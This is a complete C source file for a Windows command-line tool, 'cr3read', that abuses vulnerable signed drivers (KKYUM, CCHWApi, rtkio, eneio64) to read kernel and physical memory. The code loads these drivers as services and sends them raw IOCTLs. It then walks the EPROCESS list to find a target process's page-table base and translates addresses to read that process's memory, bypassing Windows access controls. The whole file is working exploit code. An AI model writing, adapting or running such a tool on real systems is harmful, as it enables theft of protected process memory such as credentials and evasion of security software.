// cr3read.exe - CR3 page-table traversal + arbitrary process/exe VA read.
//
// 1) KKYUM.sys is used as kernel-VA reader to resolve target process CR3:
//      ntoskrnl base (EnumDeviceDrivers) -> export PsInitialSystemProcess ->
//      System EPROCESS -> discover EPROCESS offsets (PID / ActiveProcessLinks /
//      DirectoryTableBase) -> walk process list -> target EPROCESS -> CR3.
// 2) CR3 is used to walk x64 4-level page tables using a physical-memory reader
//      (CCHWApi.sys 0x8024003C by default).
// 3) Target VA default = module base of a named module in the target process.
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#define IOCTL_KKYUM_READ  0x22265Cu
#define IOCTL_CCHWAPI_READ 0x8024003Cu

#define KVA_MIN 0xFFFF800000000000ull
#define MAX_PHYS 0x10000000000ull   // 1 TiB sanity limit for page-table physical addresses

static HANDLE g_kkyum = INVALID_HANDLE_VALUE;
static HANDLE g_phys = INVALID_HANDLE_VALUE;
static int g_phys_mode = 0;   // 0 = CCHWApi 0x8024003C, 1 = rtkio IOCTL_PHYMEM_MAP 0x80002000
static const wchar_t *g_phys_driver = NULL;
static const wchar_t *g_kkyum_driver = NULL;
static wchar_t g_svc_phys[128], g_svc_kkyum[128];
static int g_kkyum_created = 0, g_phys_created = 0;
static void svc_stop_delete(const wchar_t *name);

static void cleanup_drivers(void) {
    if (g_kkyum != INVALID_HANDLE_VALUE) { CloseHandle(g_kkyum); g_kkyum = INVALID_HANDLE_VALUE; }
    if (g_phys != INVALID_HANDLE_VALUE) { CloseHandle(g_phys); g_phys = INVALID_HANDLE_VALUE; }
    if (g_kkyum_created) svc_stop_delete(g_svc_kkyum);
    if (g_phys_created) svc_stop_delete(g_svc_phys);
}

static void die(const char *msg) { fprintf(stderr, "[ERR] %s (err=%lu)\n", msg, GetLastError()); }

// ---------------- driver service helpers ----------------
static BOOL svc_create_start(const wchar_t *name, const wchar_t *path) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return FALSE;
    SC_HANDLE svc = CreateServiceW(scm, name, name, SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                   SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, path, NULL, NULL, NULL, NULL, NULL);
    if (!svc) {
        DWORD e = GetLastError();
        if (e == ERROR_SERVICE_EXISTS || e == ERROR_SERVICE_MARKED_FOR_DELETE)
            svc = OpenServiceW(scm, name, SERVICE_ALL_ACCESS);
    }
    if (!svc) { CloseServiceHandle(scm); return FALSE; }
    BOOL ok = StartServiceW(svc, 0, NULL);
    if (!ok && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) ok = FALSE;
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return ok;
}

static void svc_stop_delete(const wchar_t *name) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return;
    SC_HANDLE svc = OpenServiceW(scm, name, SERVICE_ALL_ACCESS);
    if (svc) {
        SERVICE_STATUS st;
        ControlService(svc, SERVICE_CONTROL_STOP, &st);
        DeleteService(svc);
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
}

// ---------------- KKYUM kernel VA read ----------------
static int kkyum_open(void) {
    for (int i = 0; i < 20; i++) {
        g_kkyum = CreateFileW(L"\\\\.\\KKYUM", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (g_kkyum != INVALID_HANDLE_VALUE) return 1;
        Sleep(100);
    }
    return 0;
}

static int kread(uint64_t va, void *buf, uint32_t size) {
    if (g_kkyum == INVALID_HANDLE_VALUE) return 0;
    uint8_t in[32];
    uint32_t pid = GetCurrentProcessId();
    memset(in, 0, sizeof(in));
    *(uint32_t *)(in + 0) = pid;
    *(uint32_t *)(in + 4) = 1;
    *(uint64_t *)(in + 8) = va;
    *(uint64_t *)(in + 16) = (uint64_t)(uintptr_t)buf;
    *(uint64_t *)(in + 24) = size;
    DWORD ret = 0;
    return DeviceIoControl(g_kkyum, IOCTL_KKYUM_READ, in, sizeof(in), NULL, 0, &ret, NULL) ? 1 : 0;
}

static int kread64(uint64_t va, uint64_t *out) { return kread(va, out, 8); }
static int kread32(uint64_t va, uint32_t *out) { return kread(va, out, 4); }

// ---------------- physical read via CCHWApi ----------------
static int phys_open(void) {
    const wchar_t *dev = (g_phys_mode == 1) ? L"\\\\.\\rtkio"
                        : (g_phys_mode == 2) ? L"\\\\.\\GLCKIo"
                        : L"\\\\.\\CCHWAPI";
    for (int i = 0; i < 20; i++) {
        g_phys = CreateFileW(dev, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (g_phys != INVALID_HANDLE_VALUE) return 1;
        Sleep(100);
    }
    return 0;
}

static int pread(uint64_t pa, void *buf, uint32_t size) {
    if (g_phys == INVALID_HANDLE_VALUE) return 0;
    if (g_phys_mode == 1) {
        // rtkio IOCTL_PHYMEM_MAP 0x80002000: map page-aligned PA -> user VA, then ReadProcessMemory
        uint64_t page = pa & ~0xFFFull;
        uint32_t off = (uint32_t)(pa & 0xFFF);
        uint32_t mapSize = (off + size + 0xFFF) & ~0xFFFu;
        uint8_t in[16];
        uint64_t uva = 0;
        DWORD ret = 0;
        memset(in, 0, sizeof(in));
        *(uint64_t *)(in + 0) = page;
        *(uint32_t *)(in + 8) = mapSize;
        if (!DeviceIoControl(g_phys, 0x80002000u, in, sizeof(in), &uva, sizeof(uva), &ret, NULL) || !uva)
            return 0;
        SIZE_T got = 0;
        if (!ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)(uva + off), buf, size, &got) || got != size)
            return 0;
        return 1;
    }
    if (g_phys_mode == 2) {
        // eneio64 (WinIO section mapping) IOCTL_WINIO_MAPPHYSTOLIN 0x80102040:
        // input 40B { u64 size; u64 pa; ... }, output contains mapped linear address at +24.
        uint8_t in[40], out[40];
        DWORD ret = 0;
        memset(in, 0, sizeof(in));
        memset(out, 0, sizeof(out));
        *(uint64_t *)(in + 0) = size;
        *(uint64_t *)(in + 8) = pa;
        if (!DeviceIoControl(g_phys, 0x80102040u, in, sizeof(in), out, sizeof(out), &ret, NULL))
            return 0;
        uint64_t cands[3] = { *(uint64_t *)(out + 24), *(uint64_t *)(out + 16), *(uint64_t *)(out + 32) };
        for (int i = 0; i < 3; i++) {
            if (cands[i] < 0x10000) continue;
            SIZE_T got = 0;
            if (ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)cands[i], buf, size, &got) && got == size)
                return 1;
        }
        return 0;
    }
    uint32_t len = size + 0x14;
    uint8_t *b = (uint8_t *)malloc(len);
    DWORD ret = 0;
    if (!b) return 0;
    memset(b, 0, len);
    *(uint64_t *)(b + 8) = pa;
    *(uint32_t *)(b + 0x10) = size;
    BOOL ok = FALSE;
    for (int attempt = 0; attempt < 3 && !ok; attempt++) {
        ok = DeviceIoControl(g_phys, IOCTL_CCHWAPI_READ, b, len, b, len, &ret, NULL);
        if (!ok) Sleep(30);
    }
    if (ok) memcpy(buf, b + 0x14, size);
    free(b);
    return ok ? 1 : 0;
}

static int pread64(uint64_t pa, uint64_t *out) { return pread(pa, out, 8); }

// ---------------- ntoskrnl export parsing ----------------
static uint32_t g_nt_rva_PsInitialSystemProcess = 0;

static uint8_t *read_file(const char *path, DWORD *out_size) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long n = ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t *b = (uint8_t *)malloc((size_t)n);
    if (!b) { fclose(f); return NULL; }
    if (fread(b, 1, (size_t)n, f) != (size_t)n) { free(b); fclose(f); return NULL; }
    fclose(f);
    *out_size = (DWORD)n;
    return b;
}

static uint32_t rva_to_off(uint8_t *img, uint32_t size, uint32_t rva) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (size < sizeof(IMAGE_DOS_HEADER) || dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(img + dos->e_lfanew);
    if ((uint8_t *)nt + sizeof(IMAGE_NT_HEADERS64) > img + size) return 0;
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        uint32_t va = sec[i].VirtualAddress, vs = sec[i].Misc.VirtualSize;
        if (rva >= va && rva < va + vs) return sec[i].PointerToRawData + (rva - va);
    }
    return rva;
}

static int parse_export(const char *name, uint32_t *out_rva) {
    DWORD sz = 0;
    uint8_t *img = read_file("C:\\Windows\\System32\\ntoskrnl.exe", &sz);
    if (!img) { fprintf(stderr, "[ERR] cannot read ntoskrnl.exe\n"); return 0; }
    int ok = 0;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
        IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(img + dos->e_lfanew);
        IMAGE_DATA_DIRECTORY *dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (dir->VirtualAddress && dir->Size) {
            uint32_t off = rva_to_off(img, sz, dir->VirtualAddress);
            IMAGE_EXPORT_DIRECTORY *ed = (IMAGE_EXPORT_DIRECTORY *)(img + off);
            uint32_t nameOff = rva_to_off(img, sz, ed->AddressOfNames);
            uint32_t ordOff = rva_to_off(img, sz, ed->AddressOfNameOrdinals);
            uint32_t funOff = rva_to_off(img, sz, ed->AddressOfFunctions);
            for (uint32_t i = 0; i < ed->NumberOfNames; i++) {
                uint32_t no = rva_to_off(img, sz, ((uint32_t *)(img + nameOff))[i]);
                const char *fn = (const char *)(img + no);
                if (strcmp(fn, name) == 0) {
                    uint16_t ord = ((uint16_t *)(img + ordOff))[i];
                    *out_rva = ((uint32_t *)(img + funOff))[ord];
                    ok = 1;
                    break;
                }
            }
        }
    }
    free(img);
    return ok;
}

// ---------------- process list / EPROCESS ----------------
typedef struct {
    uint32_t pid_off;
    uint32_t links_off;
    uint32_t image_off;
} eproc_layout;

static int read_kernel_bytes(uint64_t va, void *buf, uint32_t size) {
    if (!kread(va, buf, size)) { fprintf(stderr, "[ERR] KKYUM kernel read failed at 0x%llX\n", (unsigned long long)va); return 0; }
    return 1;
}

static int discover_layout(uint64_t sys_eproc, uint32_t target_pid, eproc_layout *lay, uint64_t *out_eproc) {
    uint8_t buf[0x1000];
    if (!read_kernel_bytes(sys_eproc, buf, sizeof(buf))) return 0;

    // 1) Find ImageFileName offset ("System").
    uint32_t img_off = 0;
    for (uint32_t o = 0x100; o < 0x900; o++) {
        if (memcmp(buf + o, "System", 6) == 0) { img_off = o; break; }
    }

    // 2) Candidate ActiveProcessLinks offsets (structural list validation).
    typedef struct { uint32_t off; int count; } cand_t;
    cand_t cands[32];
    int ncand = 0;
    for (uint32_t o = 0x100; o < 0x900; o += 8) {
        uint64_t fl = 0, bl = 0, x = 0;
        memcpy(&fl, buf + o, 8);
        memcpy(&bl, buf + o + 8, 8);
        if (fl < KVA_MIN || bl < KVA_MIN) continue;
        uint64_t cur = sys_eproc + o;
        if (!kread64(bl, &x) || x != cur) continue;
        if (!kread64(fl + 8, &x) || x != cur) continue;
        uint64_t link = fl, prev = cur;
        int count = 0, ok = 1;
        while (count < 1024) {
            uint64_t back = 0, next = 0;
            if (!kread64(link + 8, &back) || back != prev) { ok = 0; break; }
            if (!kread64(link, &next)) { ok = 0; break; }
            count++;
            prev = link;
            if (next == cur) break;
            link = next;
            if (link < KVA_MIN) { ok = 0; break; }
        }
        if (ok && count > 1 && ncand < (int)(sizeof(cands) / sizeof(cands[0]))) {
            cands[ncand].off = o;
            cands[ncand].count = count;
            ncand++;
        }
    }
    printf("[DBG] links candidates: %d\n", ncand);

    // 3) For each links candidate, find a PID offset whose walk includes target PID.
    for (int ci = 0; ci < ncand; ci++) {
        uint32_t lo = cands[ci].off;
        for (uint32_t po = 0x100; po < 0x900; po += 8) {
            uint64_t v = 0;
            memcpy(&v, buf + po, 8);
            if (v != 4) continue;                     // System EPROCESS PID = 4
            uint64_t link = 0;
            if (!kread64(sys_eproc + lo, &link)) continue;
            int ok = 1, count = 0;
            uint64_t target = 0;
            while (link >= KVA_MIN && count < 1024) {
                uint64_t node = link - lo;
                uint32_t pid32 = 0;
                if (!kread32(node + po, &pid32) || pid32 > 0x100000) { ok = 0; break; }
                if (pid32 == target_pid) target = node;
                count++;
                uint64_t next = 0;
                if (!kread64(node + lo, &next)) { ok = 0; break; }
                if (next == sys_eproc + lo) break;
                link = next;
            }
            if (ok && count > 1 && target && img_off) {
                lay->pid_off = po;
                lay->links_off = lo;
                lay->image_off = img_off;
                *out_eproc = target;
                printf("[OK] EPROCESS layout: pid=+0x%X links=+0x%X image=+0x%X (list count=%d)\n",
                       po, lo, img_off, count);
                return 1;
            }
        }
    }
    fprintf(stderr, "[ERR] cannot find a consistent EPROCESS layout containing target PID %u\n", target_pid);
    return 0;
}

static uint64_t find_eprocess(uint64_t sys_eproc, const eproc_layout *lay, uint32_t target_pid) {
    if (target_pid == 4) return sys_eproc;
    uint64_t start = sys_eproc + lay->links_off;
    uint64_t link;
    if (!kread64(start, &link)) return 0;
    for (int i = 0; i < 4096 && link >= KVA_MIN; i++) {
        uint64_t node = link - lay->links_off;
        uint32_t pid = 0;
        if (!kread32(node + lay->pid_off, &pid)) return 0;
        if (pid == target_pid) return node;
        uint64_t next = 0;
        if (!kread64(node + lay->links_off, &next) || next == start) return 0;
        link = next;
    }
    return 0;
}

// ---------------- page table walk ----------------
static uint64_t g_cr3 = 0;

static int va_to_pa(uint64_t va, uint64_t *out_pa) {
    uint64_t e = 0;
    uint64_t pml4 = g_cr3 & 0x000FFFFFFFFFF000ull;
    if (pml4 >= MAX_PHYS) return 0;
    if (!pread64(pml4 + (((va >> 39) & 0x1FF) * 8), &e) || !(e & 1)) return 0;
    uint64_t pdpt = e & 0x000FFFFFFFFFF000ull;
    if (pdpt >= MAX_PHYS) return 0;
    if (!pread64(pdpt + (((va >> 30) & 0x1FF) * 8), &e) || !(e & 1)) return 0;
    if (e & 0x80) { *out_pa = (e & 0x000FFFFFC0000000ull) + (va & 0x3FFFFFFFull); return 1; }
    uint64_t pd = e & 0x000FFFFFFFFFF000ull;
    if (pd >= MAX_PHYS) return 0;
    if (!pread64(pd + (((va >> 21) & 0x1FF) * 8), &e) || !(e & 1)) return 0;
    if (e & 0x80) { *out_pa = (e & 0x000FFFFFFFE00000ull) + (va & 0x1FFFFFull); return 1; }
    uint64_t pt = e & 0x000FFFFFFFFFF000ull;
    if (pt >= MAX_PHYS) return 0;
    if (!pread64(pt + (((va >> 12) & 0x1FF) * 8), &e) || !(e & 1)) return 0;
    uint64_t pa = (e & 0x000FFFFFFFFFF000ull) + (va & 0xFFFull);
    if (pa >= MAX_PHYS) return 0;
    *out_pa = pa;
    return 1;
}

static int read_va(uint64_t va, uint8_t *out, uint32_t size) {
    uint32_t done = 0;
    while (done < size) {
        uint64_t cur = va + done;
        uint64_t pa = 0;
        if (!va_to_pa(cur, &pa)) { fprintf(stderr, "[ERR] VA 0x%llX not mapped\n", (unsigned long long)cur); return 0; }
        uint32_t page_off = (uint32_t)(cur & 0xFFF);
        uint32_t chunk = size - done;
        if (chunk > 0x1000 - page_off) chunk = 0x1000 - page_off;
        if (!pread(pa, out + done, chunk)) { fprintf(stderr, "[ERR] physical read failed PA=0x%llX\n", (unsigned long long)pa); return 0; }
        done += chunk;
    }
    return 1;
}

// ---------------- target module base ----------------
static uint64_t module_base(uint32_t pid, const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    MODULEENTRY32W me;
    me.dwSize = sizeof(me);
    uint64_t base = 0;
    if (Module32FirstW(snap, &me)) {
        do {
            char mod[256];
            WideCharToMultiByte(CP_ACP, 0, me.szModule, -1, mod, sizeof(mod), NULL, NULL);
            if (!name || _stricmp(mod, name) == 0) { base = (uint64_t)(uintptr_t)me.modBaseAddr; break; }
        } while (Module32NextW(snap, &me));
    }
    CloseHandle(snap);
    return base;
}

static void usage(void) {
    printf("cr3read - CR3 page-table walk / arbitrary process VA read\n");
    printf("Usage: cr3read --pid <pid> [--module <name>] [--va <hex>] [--size <n>] [--dump] [--compare]\n");
    printf("        --kkyum-driver <path> --phys-driver <path>\n");
    printf("  default VA = module base (first module if --module omitted)\n");
}

int main(int argc, char **argv) {
    uint32_t pid = 0;
    const char *module = NULL;
    uint64_t va = 0;
    uint32_t size = 0x40;
    int dump = 0, compare = 0;
    wchar_t kkyum_path[1024], phys_path[1024];
    kkyum_path[0] = phys_path[0] = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--pid") == 0 && i + 1 < argc) pid = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--module") == 0 && i + 1 < argc) module = argv[++i];
        else if (strcmp(argv[i], "--va") == 0 && i + 1 < argc) va = _strtoui64(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--size") == 0 && i + 1 < argc) size = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--dump") == 0) dump = 1;
        else if (strcmp(argv[i], "--compare") == 0) compare = 1;
        else if (strcmp(argv[i], "--kkyum-driver") == 0 && i + 1 < argc) MultiByteToWideChar(CP_ACP, 0, argv[++i], -1, kkyum_path, 1024);
        else if (strcmp(argv[i], "--phys-driver") == 0 && i + 1 < argc) MultiByteToWideChar(CP_ACP, 0, argv[++i], -1, phys_path, 1024);
        else if (strcmp(argv[i], "--phys-mode") == 0 && i + 1 < argc) {
            const char *m = argv[++i];
            g_phys_mode = (strcmp(m, "rtkio") == 0) ? 1 : (strcmp(m, "eneio64") == 0) ? 2 : 0;
        }
        else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) { usage(); return 0; }
    }
    if (!pid || !kkyum_path[0] || !phys_path[0]) { usage(); return 6; }

    // Load helper drivers (reuse already-loaded devices when possible).
    atexit(cleanup_drivers);
    wsprintfW(g_svc_kkyum, L"Cr3ReadKkyum_%u", GetCurrentProcessId());
    wsprintfW(g_svc_phys, L"Cr3ReadPhys_%u", GetCurrentProcessId());
    if (!kkyum_open()) {
        if (!svc_create_start(g_svc_kkyum, kkyum_path)) { fprintf(stderr, "[ERR] cannot load KKYUM driver err=%lu\n", GetLastError()); return 7; }
        g_kkyum_created = 1;
        if (!kkyum_open()) { fprintf(stderr, "[ERR] cannot open KKYUM device\n"); return 7; }
    }
    if (!phys_open()) {
        if (!svc_create_start(g_svc_phys, phys_path)) { fprintf(stderr, "[ERR] cannot load physical driver err=%lu\n", GetLastError()); return 7; }
        g_phys_created = 1;
        if (!phys_open()) { fprintf(stderr, "[ERR] cannot open physical device\n"); return 7; }
    }

    // ntoskrnl base
    DWORD needed = 0;
    uint64_t nt_base = 0;
    if (EnumDeviceDrivers(NULL, 0, &needed) && needed) {
        LPVOID *arr = (LPVOID *)malloc(needed);
        DWORD got = 0;
        if (arr && EnumDeviceDrivers(arr, needed, &got)) {
            int n = (int)(got / sizeof(LPVOID));
            for (int i = 0; i < n; i++) {
                char nm[MAX_PATH] = {0};
                if (GetDeviceDriverBaseNameA(arr[i], nm, sizeof(nm)) &&
                    (_stricmp(nm, "ntoskrnl.exe") == 0 || _stricmp(nm, "ntkrnlmp.exe") == 0)) {
                    nt_base = (uint64_t)(uintptr_t)arr[i];
                    break;
                }
            }
        }
        free(arr);
    }
    if (!nt_base) { fprintf(stderr, "[ERR] cannot get ntoskrnl base (run elevated)\n"); return 7; }
    printf("[OK] ntoskrnl base = 0x%llX\n", (unsigned long long)nt_base);

    if (!parse_export("PsInitialSystemProcess", &g_nt_rva_PsInitialSystemProcess)) {
        fprintf(stderr, "[ERR] cannot resolve PsInitialSystemProcess export\n");
        return 7;
    }
    uint64_t sys_ptr_va = nt_base + g_nt_rva_PsInitialSystemProcess;
    uint64_t sys_eproc = 0;
    if (!kread64(sys_ptr_va, &sys_eproc) || sys_eproc < KVA_MIN) {
        fprintf(stderr, "[ERR] cannot read PsInitialSystemProcess value\n");
        return 7;
    }
    printf("[OK] System EPROCESS = 0x%llX\n", (unsigned long long)sys_eproc);
    {
        uint64_t sys_dtb = 0;
        if (kread64(sys_eproc + 0x28, &sys_dtb))
            printf("[DBG] System EPROCESS+0x28 = 0x%llX\n", (unsigned long long)sys_dtb);
    }

    eproc_layout lay;
    uint64_t tgt = 0;
    if (!discover_layout(sys_eproc, pid, &lay, &tgt)) return 8;
    printf("[OK] target EPROCESS = 0x%llX (pid=%u)\n", (unsigned long long)tgt, pid);
    {
        uint8_t eb[0x300];
        if (kread(tgt, eb, sizeof(eb))) {
            uint64_t dtb28 = 0, dtb158 = 0;
            memcpy(&dtb28, eb + 0x28, 8);
            memcpy(&dtb158, eb + 0x158, 8);
            printf("[DBG] EPROCESS+0x28 (DirectoryTableBase) = 0x%llX\n", (unsigned long long)dtb28);
            printf("[DBG] EPROCESS+0x158 (UserDirectoryTableBase) = 0x%llX\n", (unsigned long long)dtb158);
            printf("[DBG] page-aligned phys-looking qwords in target EPROCESS:\n");
            int n = 0;
            for (uint32_t o = 0; o + 8 <= sizeof(eb) && n < 12; o += 8) {
                uint64_t v;
                memcpy(&v, eb + o, 8);
                if (v && (v & 0xFFF) == 0 && v < 0x200000000ull) {
                    printf("        +0x%03X = 0x%llX\n", o, (unsigned long long)v);
                    n++;
                }
            }
        }
    }

    // resolve target VA
    int used_module = 0;
    if (!va) { va = module_base(pid, module); used_module = 1; }
    if (!va) { fprintf(stderr, "[ERR] cannot resolve target module base (try --va)\n"); return 8; }
    printf("[OK] target VA = 0x%llX%s\n", (unsigned long long)va, used_module ? " (module base)" : "");

    // find a page-table base: try UserDirectoryTableBase (+0x158, KVA shadow user CR3) first,
    // then DirectoryTableBase (+0x28); validate by translating target VA and reading PE header.
    uint8_t *buf = (uint8_t *)calloc(1, size);
    if (!buf) return 6;
    int ok = 0;
    int dbg = 0;
    uint32_t dtb_offsets[] = { 0x158, 0x28 };
    for (unsigned di = 0; di < sizeof(dtb_offsets) / sizeof(dtb_offsets[0]) && !ok; di++) {
        uint64_t cr3 = 0;
        if (!kread64(tgt + dtb_offsets[di], &cr3)) continue;
        if (!cr3) continue;
        cr3 &= ~0xFFFull;
        if (cr3 >= MAX_PHYS) continue;
        g_cr3 = cr3;
        uint64_t pml4e = 0;
        uint64_t pml4 = cr3 & 0x000FFFFFFFFFF000ull;
        int pr = pread64(pml4 + (((va >> 39) & 0x1FF) * 8), &pml4e);
        if (dbg < 12) {
            printf("[DBG] DTB off=0x%X cr3=0x%llX pread=%d pml4e=0x%llX present=%d\n",
                   dtb_offsets[di], (unsigned long long)cr3, pr, (unsigned long long)pml4e, (int)(pml4e & 1));
            dbg++;
        }
        if (!pr || !(pml4e & 1)) continue;
        if (read_va(va, buf, size)) {
            if (used_module && !(buf[0] == 'M' && buf[1] == 'Z')) {
                printf("[DBG] candidate off=0x%X rejected (no MZ: %02X %02X)\n", dtb_offsets[di], buf[0], buf[1]);
                continue;
            }
            printf("[OK] CR3 = 0x%llX (EPROCESS+0x%X), first bytes: %02X %02X %02X %02X\n",
                   (unsigned long long)cr3, dtb_offsets[di], buf[0], buf[1], buf[2], buf[3]);
            ok = 1;
        }
    }
    if (!ok) { fprintf(stderr, "[ERR] CR3 traversal failed\n"); return 5; }

    if (dump) {
        for (uint32_t i = 0; i < size; i++) {
            if (i % 16 == 0) printf("  %04X: ", i);
            printf("%02X ", buf[i]);
            if (i % 16 == 15) {
                printf(" |");
                for (int j = i - 15; j <= (int)i; j++) printf("%c", (buf[j] >= 32 && buf[j] < 127) ? buf[j] : '.');
                printf("|\n");
            }
        }
    }
    if (compare) {
        HANDLE h = OpenProcess(PROCESS_VM_READ, FALSE, pid);
        if (!h) { fprintf(stderr, "[ERR] OpenProcess for compare failed err=%lu\n", GetLastError()); }
        else {
            uint8_t *ref = (uint8_t *)calloc(1, size);
            SIZE_T got = 0;
            if (ref && ReadProcessMemory(h, (LPCVOID)(uintptr_t)va, ref, size, &got) && got == size) {
                printf("COMPARE=%s\n", memcmp(ref, buf, size) == 0 ? "MATCH" : "MISMATCH");
            } else {
                printf("COMPARE=UNAVAILABLE\n");
            }
            free(ref);
            CloseHandle(h);
        }
    }
    printf("VERDICT=PASS\n");
    free(buf);
    svc_stop_delete(g_svc_phys);
    svc_stop_delete(g_svc_kkyum);
    return 0;
}
